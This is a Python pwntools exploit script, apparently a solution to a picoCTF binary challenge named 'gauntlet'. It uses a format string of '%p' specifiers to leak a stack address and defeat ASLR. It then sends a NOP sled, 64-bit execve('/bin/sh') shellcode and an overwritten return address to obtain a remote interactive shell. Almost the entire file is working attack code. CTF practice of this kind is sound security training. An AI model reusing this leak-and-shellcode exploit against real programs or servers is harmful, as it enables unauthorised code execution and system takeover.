#!/usr/bin/env python3
#d509e835331047d80c23c46198350638
#python3 solution.py

from pwn import *

format_string = " | ".join(["%p" for _ in range(0,30)])
payload_offset = 0x158

p = remote("mercury.picoctf.net", 65046)
#p = process("./gauntlet")
#raw_input("attach gdb")

p.sendline(format_string)

leaks = p.recvline()  # return bytes
leaks = leaks.decode().split(' | ')   # convert byte to string
print("leaked address: ",leaks[5]) # leaked stack address to defeat ASLR

target_address = int(leaks[5], 16) - payload_offset    # stacks address where input gets copied
print("target address: ",hex(target_address))

# shell code for 64bit Ubuntu
shell = b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
nop_1 = b"\x90" * 16
nop_2 = b"\x90" * 81
payload = nop_1 + shell + nop_2 + p64(target_address)
print(payload)
p.sendline(payload)

p.interactive()
